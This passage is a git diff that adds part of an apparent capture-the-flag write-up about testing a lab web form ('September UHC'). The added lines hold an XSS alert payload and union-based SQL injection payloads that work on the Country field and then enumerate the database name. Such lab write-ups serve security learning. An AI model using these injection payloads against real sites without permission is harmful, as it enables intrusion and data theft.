@@ -26,3 +26,39 @@ I enumerate Port 80:
 
 The index page of this web it's a form to qualify for something called September UHC, let's try to inject code SQL,XSS,HTML and more.
 
+**XSS**
+
+Payload: <script>alert("SS")</script>
+
+![image](https://user-images.githubusercontent.com/79543461/177160817-3203a467-57bd-4bb6-ab4a-50d45508fc1c.png)
+
+**It's Vulnerable to XSS and HTML Injection, but i can't do anything**
+
+**SQLI**
+
+**BurpSuite**
+
+Payload: ' order by 10000-- - == **NO WORK**
+
+Payload: ' union select 1-- - == **NO WORK**
+
+**Country Field**
+
+Let's try to do this payloads with other field from request.
+
+Payload: ' union select 1-- - == **WORKS!!!!!**
+
+![image](https://user-images.githubusercontent.com/79543461/177161840-7352bb95-c77b-451d-9b9f-8d3d785baed2.png)
+
+![image](https://user-images.githubusercontent.com/79543461/177162100-a0e026a4-6b8d-4f35-b056-161b90c9238e.png)
+
+Let's go to enumerate Things.
+
+**Database**
+
+Payload: ' union select database()-- -
+
+![image](https://user-images.githubusercontent.com/79543461/177163576-b903824d-3109-4143-b421-39d210096c0e.png)
+
+
+
